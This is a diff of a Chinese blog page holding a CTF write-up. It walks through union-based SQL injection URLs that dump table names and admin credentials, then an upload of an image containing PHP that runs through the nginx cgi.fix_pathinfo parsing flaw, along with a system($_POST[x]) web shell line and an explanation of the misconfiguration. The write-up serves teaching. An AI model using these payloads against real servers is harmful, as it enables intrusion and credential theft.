@@ -14,22 +14,22 @@
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="前言  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/7sx6k.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/3rn4o.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/p4ug4.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/7sx6k.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/3rn4o.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/p4ug4.png">
 <meta property="og:image" content="http://www.lmxspace.com/2018/02/14/Happy-Moctf-要认真/7.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/otuig.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/upzz4.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/zi7eq.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/u1fd0.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/pohcz.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/t0n2j.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/dnbo6.png">
-<meta property="og:updated_time" content="2019-03-12T09:07:14.338Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/otuig.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/upzz4.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/zi7eq.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/u1fd0.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/pohcz.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/t0n2j.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/dnbo6.png">
+<meta property="og:updated_time" content="2019-04-10T04:40:07.046Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Happy-Moctf-要认真">
 <meta name="twitter:description" content="前言  给学弟的moctf出了一题，结果部署是最麻烦的题目，期间换了三次环境，我们部署时候也遇到了很多坑，最早开始的初衷是想设计一个实际渗透的环境，然后其实要getshell用到的是nginx解析漏洞。200分的题目居然还有很多师傅没做出来，就如题目一样，信息收集的时候要认真呀。">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/7sx6k.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/7sx6k.png">
     
     
         
@@ -158,31 +158,31 @@
 <a id="more"></a> 
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>  首先这题存在sql注入，并且没有设坑，并且是有回显的，所以对师傅们应该很友好。注入payload:</p>
 <p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,user(),4,5,6,7,8,9,10,database(),12,13,14,15</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/7sx6k.png" alt="4"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/7sx6k.png" alt="4"></p>
 <p>  这里如果师傅们回显手工注入的话，可能会发现报错，是因为注入姿势问题哟，这里我的payload用的是hex，不过师傅们为了方便也可以sqlmap，一样能出结果。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/3rn4o.png" alt="5"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/3rn4o.png" alt="5"></p>
 <p>表名：</p>
 <p><code>http://119.29.170.143:6003/show.php?id=id=-1%20union%20select%201,2,group_concat(unhex(hex(table_name))),4,5,6,7,8,9,10,11,12,13,14,15%20from%20%20information_schema.tables%20where%20table_schema%20=0x636D73</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/p4ug4.png" alt="6"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/p4ug4.png" alt="6"></p>
 <p>列名：</p>
 <p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,group_concat(unhex(hex(column_name))),4,5,6,7,8,9,10,11,12,13,14,15%20from%20%20information_schema.columns%20where%20table_schema%20=0x636D73</code></p>
 <p><img src="/2018/02/14/Happy-Moctf-要认真/7.png" alt="7"></p>
 <p>账号密码：</p>
 <p><code>http://119.29.170.143:6003/show.php?id=-1%20union%20select%201,2,group_concat(unhex(hex(username))),4,5,6,7,8,9,10,group_concat(unhex(hex(password))),12,13,14,15%20from%20cms_users</code></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/otuig.png" alt="8"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/otuig.png" alt="8"></p>
 <p>  密码md5解密后即可进入后台。</p>
 <p>  进入后台后发现文件上传点</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/upzz4.png" alt="9"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/upzz4.png" alt="9"></p>
 <p>  上传设置了白名单，无法直接上传php文件。通过burp信息收集，考虑到会不会是中间件解析漏洞，因此尝试上传带有php代码的图片文件。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/zi7eq.png" alt="10"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/zi7eq.png" alt="10"></p>
 <p>  通过<code>http://119.29.170.143:6003/attachment/test.jpg/.php</code>成功执行php脚本。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/u1fd0.png" alt="11"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/u1fd0.png" alt="11"></p>
 <p>  这里有个小坑，由于php版本问题<code>eval($_POST[x]); x=system(&#39;ls&#39;);</code>会报错，但是你可以变一下用<code>system($_POST[x]); x=ls</code>就好了。</p>
 <h1 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h1><p>  本地访问<code>http://127.0.0.1/test.jpg</code>时候报错，显示图片解析错误。我们访问<code>http://127.0.0.1/test.jpg/</code>的时候报404 notfound。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/pohcz.png" alt="1"></p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/t0n2j.png" alt="2"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/pohcz.png" alt="1"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/t0n2j.png" alt="2"></p>
 <p>&emsp;&emsp;其实这个漏洞与PHP版本和nginx版本都没关系，是配置文件的锅，这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。这里简单举个例子，当php遇到文件路径“/a.jpg/b.txt/c.php”时，若“/a.jpg/b.txt/c.php”不存在，则会去掉最后的“/c.php”，然后判断“/a.jpg/b.txt”是否存在，若存在，则把“/a.jpg/b.txt”当做文件“/a.jpg/b.txt/c.php”，若“/a.jpg/b.txt”仍不存在，则继续去掉“/b.txt”，以此类推。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/dnbo6.png" alt="3"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/dnbo6.png" alt="3"></p>
 <p>  该选项在配置文件php.ini中。若是关闭该选项，访问 <code>http://127.0.0.1/test.jpg/test.php</code> 只会返回找不到文件。但关闭该选项很可能会导致一些其他错误，所以一般是开启的。</p>
 <p>  然而因为新版本的php引入了“security.limit_extensions”，限制了可执行文件的后缀，默认只允许执行.php文件，用来缓解这个问题.其次为什么说这个是nginx解析漏洞，而不是php的锅，我当初也有这个疑问，因为配置文件都在php上，和nginx没关系啊。翻了下几个常见的中间件的业务逻辑才明白了，因为Nginx在接收到url请求的时候，如果URL中路径名以.php结尾，它不会去自查本地是否存在这个文件，而是直接将这个url转发给php进行处理（IIS也有这个问题，配合PHP如果配置不当也是存在的）。而如Apache等，会根据文件是否存在做个判断，然后在做下一步动作。而cgi.fix_pathinfo是php独有的特性，若在php前便已正确判断了文件是否存在，cgi.fix_pathinfo便派不上用场了，这一问题自然也就不存在了。</p>
 
@@ -259,6 +259,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
